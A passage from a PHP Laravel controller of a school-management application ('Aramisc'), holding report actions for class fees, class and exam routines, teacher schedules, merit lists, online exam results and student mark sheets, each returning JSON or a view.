            $assign_subjects->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            if ($request->section != "") {
                $assign_subjects->where('section_id', $request->section);
            }
            $assign_subjects->where('class_id', $request->class);
            $assign_subjects = $assign_subjects->get();
            $assign_class_teacher = AramiscAssignClassTeacher::query();
            $assign_class_teacher->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1);
            if ($request->section != "") {
                $assign_class_teacher->where('section_id', $request->section);
            }
            $assign_class_teacher->where('class_id', $request->class);
            $assign_class_teacher = $assign_class_teacher->first();
            if ($assign_class_teacher != "") {
                $assign_class_teachers = $assign_class_teacher->classTeachers->first();
            } else {
                $assign_class_teachers = '';
            }

            $total_collection = 0;
            $total_assign = 0;
            foreach ($students as $student) {
                $fees_assigns = AramiscFeesAssign::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where("student_id", $student->id)->where('active_status', 1)->get();
                foreach ($fees_assigns as $fees_assign) {
                    $fees_masters = AramiscFeesMaster::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('id', $fees_assign->fees_master_id)->get();
                    foreach ($fees_masters as $fees_master) {
                        $total_collection = $total_collection + AramiscFeesPayment::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('student_id', $student->id)->where('fees_type_id', $fees_master->fees_type_id)->sum('amount');
                    }
                }

                foreach ($fees_assigns as $fees_assign) {
                    $fees_master = AramiscFeesMaster::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('id', $fees_assign->fees_master_id)->first();
                    $total_assign = $total_assign + $fees_master->amount;
                }
            }


            $classes = AramiscClass::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('active_status', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['students'] = $students->toArray();
                $data['assign_subjects'] = $assign_subjects;
                $data['assign_class_teachers'] = $assign_class_teachers;
                $data['total_collection'] = $total_collection;
                $data['total_assign'] = $total_assign;
                $data['class'] = $class;
                $data['section'] = $section;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.reports.class_report', compact('classes', 'students', 'assign_subjects', 'assign_class_teachers', 'total_collection', 'total_assign', 'class', 'section'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classRoutineReport(Request $request)
    {


        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.reports.class_routine_report', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classRoutineReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $class_times = AramiscClassTime::where('type', 'class')->get();
            $class_id = $request->class;
            $section_id = $request->section;
            $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['class_times'] = $class_times->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['aramisc_weekends'] = $aramisc_weekends->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.class_routine_report', compact('classes', 'class_times', 'class_id', 'section_id', 'aramisc_weekends'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function examRoutineReport(Request $request)
    {

        try {
            $exam_types = AramiscExamType::get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($exam_types, null);
            }
            return view('backEnd.reports.exam_routine_report', compact('classes', 'exam_types'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function examRoutineReportSearch(Request $request)
    {

        try {
            $exam_types = AramiscExamType::where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exam_periods = AramiscClassTime::where('type', 'exam')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exam_routines = AramiscExamSchedule::where('exam_term_id', $request->exam)->orderBy('date', 'ASC')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exam_routines = $exam_routines->distinct('date');

            $exam_term_id = $request->exam;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exam_types'] = $exam_types->toArray();
                $data['exam_routines'] = $exam_routines->toArray();
                $data['exam_periods'] = $exam_periods->toArray();
                $data['exam_term_id'] = $exam_term_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.reports.exam_routine_report', compact('exam_types', 'exam_routines', 'exam_periods', 'exam_term_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function teacherClassRoutineReport(Request $request)
    {

        try {
            $teachers = AramiscStaff::select('id', 'full_name')->where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
        })->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($teachers, null);
            }
            return view('backEnd.reports.teacher_class_routine_report', compact('teachers'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function teacherClassRoutineReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'teacher' => 'required',
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $class_times = AramiscClassTime::where('type', 'class')->get();
            $teacher_id = $request->teacher;
            $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
            $teachers = AramiscStaff::select('id', 'full_name')->where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['class_times'] = $class_times->toArray();
                $data['teacher_id'] = $teacher_id;
                $data['aramisc_weekends'] = $aramisc_weekends->toArray();
                $data['teachers'] = $teachers->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.teacher_class_routine_report', compact('class_times', 'teacher_id', 'aramisc_weekends', 'teachers'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function meritListReport(Request $request)
    {
        try {
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exams'] = $exams->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.merit_list_report', compact('exams', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function meritListReportSearch(Request $request)
    {
        try {
            $iid = time();
            DB::statement('SET FOREIGN_KEY_CHECKS=0;');
            if ($request->method() == 'POST') {


                $input = $request->all();
                $validator = Validator::make($input, [
                    'exam' => 'required',
                    'class' => 'required',
                    'section' => 'required'
                ]);

                if ($validator->fails()) {
                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
                    }
                    return redirect()->back()
                        ->withErrors($validator)
                        ->withInput();
                }

                $InputClassId = $request->class;
                $InputExamId = $request->exam;
                $InputSectionId = $request->section;

                $class          = AramiscClass::find($InputClassId);
                $section        = AramiscSection::find($InputSectionId);
                $exam           = AramiscExamType::find($InputExamId);

                $optional_subject_setup = AramiscClassOptionalSubject::where('class_id', '=', $request->class)->first();

                $is_data = DB::table('aramisc_mark_stores')->where([['class_id', $InputClassId], ['section_id', $InputSectionId], ['exam_term_id', $InputExamId]])->first();
                if (empty($is_data)) {
                    return redirect()->back()->with('message-danger', 'Your result is not found!');
                }

                $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();



                $subjects = AramiscSubject::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $assign_subjects = AramiscAssignSubject::where('class_id', $class->id)->where('section_id', $section->id)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $class_name = $class->class_name;


                $exam_name = $exam->title;

                $eligible_subjects       = AramiscAssignSubject::where('class_id', $InputClassId)->where('section_id', $InputSectionId)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $eligible_students       = AramiscStudent::where('class_id', $InputClassId)->where('section_id', $InputSectionId)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();



                $subject_ids        = [];
                $subject_strings    = '';
                $subject_id_strings = '';
                $marks_string       = '';
                foreach ($eligible_students as $SingleStudent) {
                    foreach ($eligible_subjects as $subject) {
                        $subject_ids[]      = $subject->subject_id;
                        $subject_strings    = (empty($subject_strings)) ? $subject->subject->subject_name : $subject_strings . ',' . $subject->subject->subject_name;
                        $subject_id_strings    = (empty($subject_id_strings)) ? $subject->subject_id : $subject_id_strings . ',' . $subject->subject_id;
                        $getMark            =  AramiscResultStore::where([
                            ['exam_type_id',   $InputExamId],
                            ['class_id',       $InputClassId],
                            ['section_id',     $InputSectionId],
                            ['student_id',     $SingleStudent->id],
                            ['subject_id',     $subject->subject_id]
                        ])->first();
                        if ($getMark == "") {
                            return redirect()->back()->with('message-danger', 'Please register marks for all students.!');
                        }


                        if ($marks_string == "") {
                            if ($getMark->total_marks == 0) {
                                $marks_string = '0';
                            } else {
                                $marks_string = $getMark->total_marks;
                            }
                        } else {
                            $marks_string = $marks_string . ',' . $getMark->total_marks;
                        }
                    }



                    $results                =  AramiscResultStore::where([
                        ['exam_type_id',   $InputExamId],
                        ['class_id',       $InputClassId],
                        ['section_id',     $InputSectionId],
                        ['student_id',     $SingleStudent->id]
                    ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                    $is_absent                =  AramiscResultStore::where([
                        ['exam_type_id',   $InputExamId],
                        ['class_id',       $InputClassId],
                        ['section_id',     $InputSectionId],
                        ['is_absent',      1],
                        ['student_id',     $SingleStudent->id]
                    ])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

                    $total_gpa_point        =  AramiscResultStore::where([
                        ['exam_type_id',   $InputExamId],
                        ['class_id',       $InputClassId],
                        ['section_id',     $InputSectionId],
                        ['student_id',     $SingleStudent->id]
                    ])->sum('total_gpa_point');

                    $total_marks            =  AramiscResultStore::where([
                        ['exam_type_id',   $InputExamId],
                        ['class_id',       $InputClassId],
                        ['section_id',     $InputSectionId],
                        ['student_id',     $SingleStudent->id]
                    ])->sum('total_marks');


                    $sum_of_mark = ($total_marks == 0) ? 0 : $total_marks;
                    $average_mark = ($total_marks == 0) ? 0 : floor($total_marks / $results->count()); //get average number
                    $is_absent = (count($is_absent) > 0) ? 1 : 0;         //get is absent ? 1=Absent, 0=Present
                    $total_GPA = ($total_gpa_point == 0) ? 0 : $total_gpa_point / $results->count();
                    $exart_gp_point = number_format($total_GPA, 2, '.', '');            //get gpa results
                    $full_name          =   $SingleStudent->full_name;                 //get name
                    $admission_no       =   $SingleStudent->admission_no;           //get admission no
                    $student_id       =   $SingleStudent->id;           //get admission no


                    $is_existing_data = AramiscTemporaryMeritlist::where([['admission_no', $admission_no], ['class_id', $InputClassId], ['section_id', $InputSectionId], ['exam_id', $InputExamId]])->first();

                    if (empty($is_existing_data)) {
                        $insert_results                     = new AramiscTemporaryMeritlist();
                    } else {
                        $insert_results                     = AramiscTemporaryMeritlist::find($is_existing_data->id);
                    }
                    $insert_results->student_name       = $full_name;
                    $insert_results->admission_no       = $admission_no;
                    $insert_results->subjects_id_string    = implode(',', array_unique($subject_ids));
                    $insert_results->subjects_string    = $subject_strings;
                    $insert_results->marks_string       = $marks_string;
                    $insert_results->total_marks        = $sum_of_mark;
                    $insert_results->average_mark       = $average_mark;
                    $insert_results->gpa_point          = $exart_gp_point;
                    $insert_results->iid          = $iid;
                    $insert_results->student_id          = $SingleStudent->id;
                    $markGrades = AramiscMarksGrade::where([['from', '<=', $exart_gp_point], ['up', '>=', $exart_gp_point]])->first();

                    if ($is_absent == "") {
                        $insert_results->result             = $markGrades->grade_name;
                    } else {
                        $insert_results->result             = 'F';
                    }
                    $insert_results->section_id         = $InputSectionId;
                    $insert_results->class_id           = $InputClassId;
                    $insert_results->exam_id            = $InputExamId;
                    $insert_results->created_at = YearCheck::getYear() . '-' . date('m-d h:i:s');
                    $insert_results->save();




                    $subject_strings = "";
                    $marks_string = "";
                    $total_marks = 0;
                    $average = 0;
                    $exart_gp_point = 0;
                    $admission_no = 0;
                    $full_name = "";
                }



                $first_data = AramiscTemporaryMeritlist::where('iid', $iid)->first();
                $subjectlist = explode(',', $first_data->subjects_string);
                $allresult_data = AramiscTemporaryMeritlist::where('iid', $iid)->orderBy('gpa_point', 'desc')->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                $merit_serial = 1;
                foreach ($allresult_data as $row) {
                    $D = AramiscTemporaryMeritlist::where('iid', $iid)->where('id', $row->id)->first();
                    $D->merit_order = $merit_serial++;
                    $D->save();
                }



                $allresult_data = AramiscTemporaryMeritlist::orderBy('merit_order', 'asc')->where('exam_id', '=', $InputClassId)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
                // return $allresult_data;
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['exams'] = $exams->toArray();
                    $data['classes'] = $classes->toArray();
                    $data['subjects'] = $subjects->toArray();
                    $data['class'] = $class;
                    $data['section'] = $section;
                    $data['exam'] = $exam;
                    $data['subjectlist'] = $subjectlist;
                    $data['allresult_data'] = $allresult_data;
                    $data['class_name'] = $class_name;
                    $data['assign_subjects'] = $assign_subjects;
                    $data['exam_name'] = $exam_name;
                    return ApiBaseMethod::sendResponse($data, null);
                }

                return view('backEnd.reports.merit_list_report', compact('iid', 'exams', 'classes', 'subjects', 'class', 'section', 'exam', 'subjectlist', 'allresult_data', 'class_name', 'assign_subjects', 'exam_name', 'InputClassId', 'InputExamId', 'InputSectionId', 'optional_subject_setup'));
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function onlineExamReport(Request $request)
    {

        try {
            $exams = AramiscOnlineExam::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exams'] = $exams->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.online_exam_report', compact('exams', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function onlineExamReportSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'exam' => 'required',
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            date_default_timezone_set("Asia/Dhaka");
            $present_date_time = date("Y-m-d H:i:s");

            $online_exam_question = AramiscOnlineExam::find($request->exam);

            $students = AramiscStudent::where('class_id', $request->class)->where('section_id', $request->section)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $online_exam = AramiscOnlineExam::where('class_id', $request->class)->where('section_id', $request->section)->where('id', $request->exam)->where('end_date_time', '<', $present_date_time)->where('status', 1)->first();


            if ($students->count() == 0 && $online_exam == "") {
                Toastr::error('No Result Found', 'Failed');
                return redirect('online-exam-report');
            }

            $present_students = [];
            foreach ($students as $student) {
                $take_exam = AramiscStudentTakeOnlineExam::where('student_id', $student->id)->where('online_exam_id', $online_exam_question->id)->first();
                if ($take_exam != "") {
                    $present_students[] = $student->id;
                }
            }

            $total_marks = 0;
            foreach ($online_exam_question->assignQuestions as $assignQuestion) {
                $total_marks = $total_marks + $assignQuestion->questionBank->marks;
            }

            $exams = AramiscOnlineExam::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $class_id = $request->class;
            $exam_id = $request->exam;


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['online_exam_question'] = $online_exam_question;
                $data['students'] = $students->toArray();
                $data['present_students'] = $present_students;
                $data['total_marks'] = $total_marks;
                $data['exams'] = $exams->toArray();
                $data['classes'] = $classes->toArray();
                $data['class_id'] = $class_id;
                $data['exam_id'] = $exam_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.reports.online_exam_report', compact('online_exam_question', 'students', 'present_students', 'total_marks', 'exams', 'classes', 'class_id', 'exam_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function markSheetReportStudent(Request $request)
    {
        try {
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exams'] = $exams->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.mark_sheet_report_student', compact('exams', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function markSheetReportStudentSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'exam' => 'required',
            'class' => 'required',
            'section' => 'required',
            'student' => 'required'
        ]);

        $input['exam_id'] = $request->exam;
        $input['class_id'] = $request->class;
        $input['section_id'] = $request->section;
        $input['student_id'] = $request->student;

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()->withErrors($validator)->withInput();
        }

        try {
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes        =   AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exam_types     =   AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $subjects = AramiscAssignSubject::where([['class_id', $request->class], ['section_id', $request->section]])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $student_detail =   $studentDetails = AramiscStudent::find($request->student);
            $section        =   AramiscSection::where('active_status', 1)->where('id', $request->section)->first();
            $section_id     =   $request->section;
            $class_id       =   $request->class;
            $class_name     =   AramiscClass::find($class_id);
            $exam_type_id   =   $request->exam;
            $student_id     =   $request->student;
            $exam_details     =   AramiscExamType::where('active_status', 1)->find($exam_type_id);

            $optional_subject = '';

            $get_optional_subject = AramiscOptionalSubjectAssign::where('student_id', '=', $student_detail->id)->where('session_id', '=', $student_detail->session_id)->first();
            if ($get_optional_subject != '') {
                $optional_subject = $get_optional_subject->subject_id;
            }
            $optional_subject_setup = AramiscClassOptionalSubject::where('class_id', '=', $request->class)->first();
            // return $student_detail;

            foreach ($subjects as $subject) {
                $mark_sheet = AramiscResultStore::where([['class_id', $request->class], ['exam_type_id', $request->exam], ['section_id', $request->section], ['student_id', $request->student]])->where('subject_id', $subject->subject_id)->first();
                if ($mark_sheet == "") {
                    Toastr::error('Ops! Your result is not found! Please check mark register', 'Failed');
                    return redirect('mark-sheet-report-student');
                }
            }

            $is_result_available = AramiscResultStore::where([
                ['class_id', $request->class],
                ['exam_type_id', $request->exam],
                ['section_id', $request->section],
                ['student_id', $request->student]
            ])
                ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                ->get();

            if ($is_result_available->count() > 0) {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['exam_types'] = $exam_types->toArray();
                    $data['classes'] = $classes->toArray();
                    $data['studentDetails'] = $studentDetails;
                    $data['exams'] = $exams->toArray();
                    $data['subjects'] = $subjects->toArray();
                    $data['section'] = $section;
                    $data['class_id'] = $class_id;
                    $data['student_detail'] = $student_detail;
                    $data['is_result_available'] = $is_result_available;
                    $data['exam_type_id'] = $exam_type_id;
                    $data['section_id'] = $section_id;
                    $data['student_id'] = $student_id;
                    $data['exam_details'] = $exam_details;
                    $data['class_name'] = $class_name;
                    return ApiBaseMethod::sendResponse($data, null);
                }
                $student = $student_id;
                return view('backEnd.reports.mark_sheet_report_student', compact('optional_subject_setup', 'exam_types', 'classes', 'studentDetails', 'exams', 'classes', 'subjects', 'section', 'class_id', 'student_detail', 'is_result_available', 'exam_type_id', 'section_id', 'student_id', 'exam_details', 'class_name', 'input', 'optional_subject'));
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Ops! Your result is not found! Please check mark register');
                }
                Toastr::error('Ops! Your result is not found! Please check mark register', 'Failed');
                return redirect('mark-sheet-report-student');
            }



            $marks_register = AramiscMarksRegister::where('exam_id', $request->exam)->where('student_id', $request->student)->first();


            $student_detail = AramiscStudent::where('id', $request->student)->first();
            $subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $grades = AramiscMarksGrade::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $class = AramiscClass::find($request->class);
            $section = AramiscSection::find($request->section);
            $exam_detail = AramiscExam::find($request->exam);
            $exam_id = $request->exam;
            $class_id = $request->class;

            return view('backEnd.reports.mark_sheet_report_student', compact('exam_types', 'optional_subject', 'classes', 'studentDetails', 'exams', 'classes', 'marks_register', 'subjects', 'class', 'section', 'exam_detail', 'grades', 'exam_id', 'class_id', 'student_detail', 'input'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function markSheetReport_Student(Request $request)
    {
        try {
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['exams'] = $exams->toArray();
                $data['classes'] = $classes->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.reports.mark_sheet_report_student', compact('exams', 'classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function markSheetReportStudent_Search(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'exam' => 'required',
            'class' => 'required',
            'section' => 'required',
            'student' => 'required'
        ]);

        $input['exam_id'] = $request->exam;
        $input['class_id'] = $request->class;
        $input['section_id'] = $request->section;
        $input['student_id'] = $request->student;


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()->withErrors($validator)->withInput();
        }

        try {
            $exams = AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $classes        =   AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $exam_types     =   AramiscExamType::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            $subjects = AramiscAssignSubject::where([['class_id', $request->class], ['section_id', $request->section]])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            $student_detail =   $studentDetails = AramiscStudent::find($request->student);
            $section        =   AramiscSection::where('active_status', 1)->where('id', $request->section)->first();
            $section_id     =   $request->section;
            $class_id       =   $request->class;
            $class_name     =   AramiscClass::find($class_id);
            $exam_type_id   =   $request->exam;
            $student_id     =   $request->student;
            $exam_details     =   AramiscExamType::where('active_status', 1)->find($exam_type_id);

            $optional_subject = '';

            $get_optional_subject = AramiscOptionalSubjectAssign::where('student_id', '=', $student_detail->id)->where('session_id', '=', $student_detail->session_id)->first();
            if ($get_optional_subject != '') {
                $optional_subject = $get_optional_subject->subject_id;
            }
            $optional_subject_setup = AramiscClassOptionalSubject::where('class_id', '=', $request->class)->first();
            // return $student_detail;

            foreach ($subjects as $subject) {
                $mark_sheet = AramiscResultStore::where([['class_id', $request->class], ['exam_type_id', $request->exam], ['section_id', $request->section], ['student_id', $request->student]])->where('subject_id', $subject->subject_id)->first();
                if ($mark_sheet == "") {
                    Toastr::error('Ops! Your result is not found! Please check mark register', 'Failed');
                    return redirect('mark-sheet-report-student');
                }
            }

            $is_result_available = AramiscResultStore::where([['class_id', $request->class], ['exam_type_id', $request->exam], ['section_id', $request->section], ['student_id', $request->student]])->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if ($is_result_available->count() > 0) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['exam_types'] = $exam_types->toArray();
                    $data['classes'] = $classes->toArray();
                    $data['studentDetails'] = $studentDetails;
                    $data['exams'] = $exams->toArray();
                    $data['subjects'] = $subjects->toArray();
                    $data['section'] = $section;
                    $data['class_id'] = $class_id;
                    $data['student_detail'] = $student_detail;
                    $data['is_result_available'] = $is_result_available;
                    $data['exam_type_id'] = $exam_type_id;
                    $data['section_id'] = $section_id;
                    $data['student_id'] = $student_id;
                    $data['exam_details'] = $exam_details;
                    $data['class_name'] = $class_name;
                    return ApiBaseMethod::sendResponse($data, null);
                }
                $student = $student_id;
                return view('backEnd.reports.mark_sheet_report_student', compact('optional_subject_setup', 'exam_types', 'classes', 'studentDetails', 'exams', 'classes', 'subjects', 'section', 'class_id', 'student_detail', 'is_result_available', 'exam_type_id', 'section_id', 'student_id', 'exam_details', 'class_name', 'input', 'optional_subject'));
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Ops! Your result is not found! Please check mark register');
                }
                Toastr::error('Ops! Your result is not found! Please check mark register', 'Failed');
                return redirect('mark-sheet-report-student');
            }



            $marks_register = AramiscMarksRegister::where('exam_id', $request->exam)->where('student_id', $request->student)->first();


            $student_detail = AramiscStudent::where('id', $request->student)->first();
